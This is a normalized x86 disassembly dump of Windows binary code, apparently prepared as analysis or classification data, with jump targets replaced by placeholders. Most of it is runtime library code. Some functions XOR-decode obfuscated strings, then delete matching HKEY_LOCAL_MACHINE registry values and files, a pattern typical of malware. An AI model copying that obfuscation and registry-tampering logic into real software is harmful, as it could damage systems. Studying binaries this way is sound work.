call sub_1006605f
add esp 0x10
test eax eax
jne r-xdata
push esi
call sub_10079b60
add esi eax
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1006605f
add esp 0xc
test eax eax
jne r-xdata
mov [ esi ] 0x0
sub_10041ef0
push ebp
mov ebp esp
sub esp 0x4a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ ebp - 0x49c ] eax
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x40
and edx 0xff
mov [ ebp + eax * 2 - 0x84 ] dx
inc eax
cmp eax 0x3f
jb r-xdata
lea ecx [ ebp - 0x490 ]
push ecx
push 0x2011b
xor eax eax
push eax
lea edx [ ebp - 0x84 ]
push edx
push 0x80000002
mov [ ebp - 0x6 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x490 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x494 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push esi
xor esi esi
cmp [ ebp - 0x494 ] esi
jbe r-xdata
mov edx [ ebp - 0x490 ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x490 ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
push edi
mov edi [ RegEnumValueW@IAT ]
nop
inc esi
cmp esi [ ebp - 0x494 ]
jb r-xdata
mov edx [ ebp - 0x49c ]
push edx
lea eax [ ebp - 0x28c ]
push eax
call [ StrStrW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4a0 ]
push eax
lea ecx [ ebp - 0x28c ]
push ecx
mov ecx [ ebp - 0x490 ]
push 0x0
push 0x0
lea edx [ ebp - 0x498 ]
push edx
lea eax [ ebp - 0x48c ]
push eax
push esi
push ecx
mov [ ebp - 0x498 ] 0xff
mov [ ebp - 0x4a0 ] 0x208
call edi
test eax eax
jne r-xdata
pop edi
mov edx [ ebp - 0x490 ]
lea ecx [ ebp - 0x48c ]
push ecx
push edx
call [ RegDeleteValueW@IAT ]
sub_10042070
push ebp
mov ebp esp
push 0xffffffff
push sub_1008381c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4a0 ] eax
mov [ ebp - 0x498 ] ebx
mov [ ebp - 0x494 ] ebx
mov [ ebp - 0x490 ] ebx
mov [ ebp - 0x4 ] ebx
xor ecx ecx
mov [ ebp - 0x468 ] 0x7
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] cx
mov [ ebp - 0x460 ] ebx
mov [ ebp - 0x45c ] ebx
lea edx [ ebp - 0x4a8 ]
mov [ ebp - 0x4 ] 0x1
push edx
mov [ ebp - 0x484 ] ebx
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ r--data ]
movsx ecx [ eax ]
xor ecx 0xff9d
and ecx 0xff
lea eax [ ebp - 0x488 ]
push eax
xor edx edx
mov [ ebp - 0x488 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x486 ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x43c ]
call sub_1002ed80
test eax eax
je r-xdata
lea eax [ ebp - 0x43c ]
lea edx [ eax + 0x2 ]
cmp [ ebp - 0x468 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x43c ]
push edx
lea ecx [ ebp - 0x47c ]
call sub_100531b0
push edi
mov [ ebp - 0x460 ] edi
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
lea ecx [ ebp - 0x47c ]
lea edi [ ebp - 0x498 ]
mov [ ebp - 0x45c ] eax
call sub_10043a70
lea edx [ ebp - 0x28 ]
mov eax 0xc7
call sub_10013830
push ebx
push r--data
push ebx
push ebx
push r--data
push ebx
push ebx
push ebx
push ebx
push r--data
mov ecx edx
mov edx [ ebp - 0x4a0 ]
push ecx
push ebx
push edx
push ebx
push r--data
push esi
xor edx edx
xor ecx ecx
lea esi [ ebp - 0x504 ]
call sub_10009be0
mov eax esi
push eax
lea edi [ ebp - 0x43c ]
call sub_10024fb0
xor ecx ecx
mov [ ebp - 0x480 ] ebx
mov [ ebp - 0x49c ] ebx
mov [ ebp - 0x444 ] 0x7
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x458 ] cx
lea ebx [ ebp - 0x458 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_10005590
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x47c ]
push ecx
call sub_1006591f
add esp 0x4
lea eax [ ebp - 0x480 ]
push eax
lea ecx [ ebp - 0x49c ]
lea ebx [ ebp - 0x498 ]
lea edx [ ebp - 0x458 ]
call sub_1005a080
test eax eax
je r-xdata
mov edi 0x8
cmp [ ebp - 0x444 ] edi
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x49c ]
cmp eax 0x1e84800
jge r-xdata
mov [ ebp - 0x484 ] 0x3
jmp r-xdata
xor eax eax
mov [ ebp - 0x458 ] ax
mov esi 0x7
xor ebx ebx
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] esi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x4 ] 0x1
call sub_100542e0
cmp [ ebp - 0x468 ] edi
jb r-xdata
mov edx [ ebp - 0x458 ]
push edx
call sub_1006591f
add esp 0x4
lea edx [ ebp - 0x484 ]
mov eax 0xb5
call sub_10013830
push edx
mov eax edx
push eax
mov ecx edx
mov edx [ rw-data ]
push ecx
push 0x1
push 0x1
push edx
lea eax [ ebp - 0x234 ]
mov [ ebp - 0x488 ] 0x1
call sub_1002ed80
test eax eax
jne r-xdata
mov ecx [ ebp - 0x480 ]
mov edx [ rw-data ]
push 0x0
push eax
push ecx
push edx
xor edx edx
xor ecx ecx
call sub_10009050
test eax eax
je r-xdata
mov esi [ ebp - 0x498 ]
mov edi [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
cmp esi [ ebp - 0x494 ]
je r-xdata
mov [ ebp - 0x468 ] esi
mov esi [ ebp - 0x498 ]
xor edx edx
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] dx
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x47c ]
push ecx
call sub_1006591f
add esp 0x4
mov esi [ ebp - 0x498 ]
mov edi [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
cmp esi [ ebp - 0x494 ]
je r-xdata
mov eax [ ebp - 0x49c ]
mov ecx [ ebp - 0x480 ]
push eax
push ecx
lea eax [ ebp - 0x234 ]
call sub_10031770
add esp 0x8
mov [ ebp - 0x488 ] eax
mov [ ebp - 0x484 ] 0x4
mov eax [ ebp - 0x480 ]
xor esi esi
cmp eax esi
je r-xdata
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edi [ ebp - 0x494 ]
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x480 ]
xor esi esi
cmp eax esi
je r-xdata
mov edx [ esi + 0x1c ]
push edx
push 0x0
call ebx
push eax
call edi
add esi 0x24
cmp esi [ ebp - 0x494 ]
jne r-xdata
mov edi 0x8
cmp [ ebp - 0x444 ] edi
jb r-xdata
push eax
push esi
call ebx
push eax
call edi
mov [ ebp - 0x480 ] esi
mov eax [ esi + 0x1c ]
push eax
push 0x0
call ebx
push eax
call edi
add esi 0x24
cmp esi [ ebp - 0x494 ]
jne r-xdata
cmp [ ebp - 0x488 ] esi
je r-xdata
push eax
push esi
call ebx
push eax
call edi
mov [ ebp - 0x480 ] esi
xor edx edx
mov ebx 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x448 ] esi
mov [ ebp - 0x458 ] dx
mov [ ebp - 0x4 ] 0x1
call sub_100542e0
cmp [ ebp - 0x468 ] edi
jb r-xdata
mov ecx [ ebp - 0x458 ]
push ecx
call sub_1006591f
add esp 0x4
lea ecx [ ebp - 0x234 ]
push ecx
call sub_10018ea0
cmp eax esi
je r-xdata
mov edi 0x8
cmp [ ebp - 0x444 ] edi
jb r-xdata
mov [ ebp - 0x468 ] ebx
mov ebx [ ebp - 0x498 ]
xor ecx ecx
mov [ ebp - 0x46c ] esi
mov [ ebp - 0x47c ] cx
cmp ebx esi
je r-xdata
mov eax [ ebp - 0x47c ]
push eax
call sub_1006591f
add esp 0x4
lea ecx [ ebp - 0x234 ]
push ecx
call [ DeleteFileW@IAT ]
mov edi 0x8
cmp [ ebp - 0x444 ] edi
jb r-xdata
lea edx [ ebp - 0x234 ]
push edx
call [ DeleteFileW@IAT ]
mov edi 0x8
cmp [ ebp - 0x444 ] edi
jb r-xdata
xor ecx ecx
mov ebx 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x448 ] esi
mov [ ebp - 0x458 ] cx
mov [ ebp - 0x4 ] 0x1
call sub_100542e0
cmp [ ebp - 0x468 ] edi
jb r-xdata
mov eax [ ebp - 0x458 ]
push eax
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x484 ]
jmp r-xdata
mov edi [ ebp - 0x494 ]
mov eax ebx
call sub_10020290
push ebx
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebp - 0x458 ] ax
mov ebx 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x448 ] esi
mov [ ebp - 0x4 ] 0x1
call sub_100542e0
cmp [ ebp - 0x468 ] edi
jb r-xdata
mov edx [ ebp - 0x458 ]
push edx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov ebx 0x7
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x448 ] esi
mov [ ebp - 0x458 ] cx
mov [ ebp - 0x4 ] 0x1
call sub_100542e0
cmp [ ebp - 0x468 ] edi
jb r-xdata
mov eax [ ebp - 0x458 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0x468 ] ebx
mov ebx [ ebp - 0x498 ]
xor eax eax
mov [ ebp - 0x46c ] esi
mov [ ebp - 0x47c ] ax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x47c ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x46c ] esi
xor edx edx
lea esi [ ebp - 0x498 ]
mov [ ebp - 0x468 ] ebx
mov [ ebp - 0x47c ] dx
call sub_10028360
xor eax eax
mov ecx [ ebp - 0x47c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x46c ] esi
xor eax eax
lea esi [ ebp - 0x498 ]
mov [ ebp - 0x468 ] ebx
mov [ ebp - 0x47c ] ax
call sub_10028360
mov eax 0x6
jmp r-xdata
mov edx [ ebp - 0x47c ]
push edx
call sub_1006591f
add esp 0x4
mov eax 0x5
jmp r-xdata
mov edi [ ebp - 0x494 ]
mov eax ebx
call sub_10020290
push ebx
call sub_1006591f
add esp 0x4
sub_100426d6
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_10039c8c
lea edi [ eax + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov [ edi ] eax
add eax 0x40
lea ebx [ edi + 0x4 ]
mov [ ebx ] eax
je r-xdata
or [ edi + 0x8 ] 0x104
jmp r-xdata
mov eax [ edi ]
and [ edi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push ebx
push 0x16
push r--data
call sub_1007d136
add esp 0xc
xor eax eax
mov esi [ ebp + 0x8 ]
mov eax esi
sub eax 0xffffff80
neg esi
sbb esi esi
and esi eax
call sub_1007d198
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
je r-xdata
mov [ edi + 0x8 ] 0x104
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
cmp esi 0xfde8
je r-xdata
push ebx
call sub_10079b60
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_1007d28d
mov [ edi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ edi + 0x8 ] 0x4
jne r-xdata
mov esi edi
call sub_1007d687
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfde9
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
and [ edi + 0x8 ] 0x0
jmp r-xdata
push edi
push 0x40
push r--data
call sub_1007d136
add esp 0xc
test eax eax
je r-xdata
mov esi edi
call sub_1007d620
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ edi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
mov esi edi
call sub_1007d687
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov esi edi
call sub_1007d620
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ edi + 0x18 ]
mov [ eax ] cx
mov cx [ edi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] si
xor eax eax
inc eax
jmp r-xdata
mov esi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ edi + 0x18 ]
call esi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_1006605f
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ edi + 0x1c ]
call esi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100492ed
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_100208c5
add esp 0x10
sub_100428d0
push ebp
mov ebp esp
mov eax [ esi ]
push edi
mov edi [ GetProcessHeap@IAT ]
test eax eax
jne r-xdata
mov edx [ esi + 0x4 ]
lea ecx [ edx * 4 + 0x4 ]
push ecx
push eax
push 0x8
call edi
push eax
call [ HeapReAlloc@IAT ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
lea ecx [ eax * 4 + 0x4 ]
push ecx
push 0x8
call edi
push eax
call [ HeapAlloc@IAT ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov [ esi ] eax
mov eax 0x2
pop edi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ lstrlenW@IAT ]
push edx
call ebx
lea eax [ eax + eax + 0x2 ]
push eax
push 0x8
call edi
push eax
call [ HeapAlloc@IAT ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov [ edx + ecx * 4 ] eax
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
mov eax 0x1
pop edi
pop ebp
retn 0x4
mov edi [ ebp + 0x8 ]
push edi
call ebx
mov edx [ esi + 0x4 ]
add eax eax
push eax
mov eax [ esi ]
mov ecx [ eax + edx * 4 ]
push edi
push ecx
call sub_100796a0
inc [ esi + 0x4 ]
add esp 0xc
pop ebx
xor eax eax
pop edi
pop ebp
retn 0x4
pop ebx
mov eax 0x3
pop edi
pop ebp
retn 0x4
sub_10042990
mov eax [ esi + 0x4 ]
dec [ eax ]
jne r-xdata
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] 0x0
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x4 ] 0x0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_100429d0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10042a11
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_100149fd
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1001d665
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1003fe0d
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x20
sub_10042ad3
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
push 0x3d
push esi
call sub_10029b88
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_1007ed52
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_1007ed00
mov edi eax
pop ecx
cmp edi ebx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_10008102
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_1001ceb1
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_10022b5a
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_10022b5a
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_10008102
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_1005ec40
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_1005ec40
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_10079b60
pop ecx
add eax 0x2
push eax
call sub_1000977c
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_10022b5a
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_10079b60
pop ecx
add eax 0x2
push eax
push edi
call sub_1006605f
add esp 0xc
test eax eax
jne r-xdata
mov [ rw-data ] eax
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100492ed
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push edi
call sub_10022b5a
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_1004fd6f
mov [ eax ] 0x2a
sub_10042d28
push 0x4
mov eax sub_1007fbec
call sub_100097c8
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
sar eax 0x1
mov [ ebp - 0x10 ] 0x1
je r-xdata
push edi
push eax
mov ecx esi
call sub_10039550
mov eax esi
call sub_1004db01
retn 0xc
lea ebx [ ecx + 0x8 ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edx 0x8
jb r-xdata
cmp eax edi
ja r-xdata
push ebx
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push [ ebp + 0xc ]
push eax
push edx
call sub_1002b602
add esp 0x14
cmp eax [ esi + 0x10 ]
jbe r-xdata
push edi
push eax
mov ecx esi
call sub_10039550
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
sub_10042db7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_10042de0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080b88
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0xec ] bl
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
mov ecx esi
call sub_1003eba0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0xc0 ] ebx
mov eax [ esi + 0xbc ]
cmp eax ebx
je r-xdata
push eax
mov eax [ esi + 0xd4 ]
call eax
mov [ esi + 0xb8 ] ebx
mov ecx [ esi + 0xd4 ]
push eax
call ecx
mov [ esi + 0xbc ] ebx
sub_10042e88
push 0x10
push r--data
call sub_10079bf0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_10043f7b
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10042f1b
mov eax [ ebp - 0x1c ]
call sub_10079c35
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_10047530
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_10022b5a
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_10042f30
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10024145
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10024145
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_1007c46b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_1007c422
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10024145
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10024145
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_1007c452
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
